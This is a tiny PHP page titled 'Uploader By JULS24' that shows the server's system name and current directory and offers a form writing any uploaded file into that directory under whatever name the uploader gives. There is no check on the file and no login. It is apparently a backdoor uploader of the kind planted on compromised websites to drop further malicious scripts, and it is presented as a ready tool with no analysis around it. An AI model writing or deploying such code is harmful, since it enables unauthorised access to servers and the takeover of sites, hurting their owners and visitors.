<html>
<title>Uploader By JULS24</title>
<p><?php echo '<b>'.php_uname().'</b>'; ?>
<br>
<?php echo '<b>'.getcwd().'</b>'; ?>
</p>
<form method='post' enctype='multipart/form-data'>
<input type='file' name='idx_file'>
<input type='submit' value='upload' name='upload'>
</form>
<?php if(isset($_POST['upload'])) { if(@copy($_FILES['idx_file']['tmp_name'], $_FILES['idx_file']['name'])) { echo$_FILES['idx_file']['name']. '[<b>OK</b>]'; } else { echo$_FILES['idx_file']['name']. '[<b>FAILED</b>'; } } ?>